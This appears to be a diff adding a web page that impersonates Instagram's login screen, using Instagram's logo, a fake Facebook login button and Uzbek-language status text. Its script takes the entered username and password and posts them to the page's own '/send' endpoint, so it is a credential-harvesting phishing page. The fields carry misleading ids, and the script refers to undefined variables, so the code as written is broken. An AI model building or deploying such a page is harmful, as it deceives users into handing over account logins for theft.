@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>InstagramPro</title>
+
+<!-- Font Awesome for icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+    <div class="login-box">
+        <!-- Instagram logo -->
+        <div class="insta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+        </div>
+
+        <form id="form">
+            <input type="text" id="ism" placeholder="Mobile number,username or email" required>
+            <input type="text" id="yosh" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+
+        <div class="divider">OR</div>
+        <div class="fb-login"><i class="fa-brands fa-facebook-square"></i> Log in with Facebook</div>
+        <p class="status" id="status"></p>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+</div>
+
+<script>
+const form = document.getElementById("form");
+const status = document.getElementById("status");
+
+form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const ism = document.getElementById("ism").value;
+    const yosh = document.getElementById("yosh").value;
+
+    try {
+        const response = await fetch("/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password })
+        });
+
+
+    } catch(err){
+        console.error(err);
+        status.style.color = "red";
+        status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
+    }
+});
+</script>
+
+</body>
+</html>
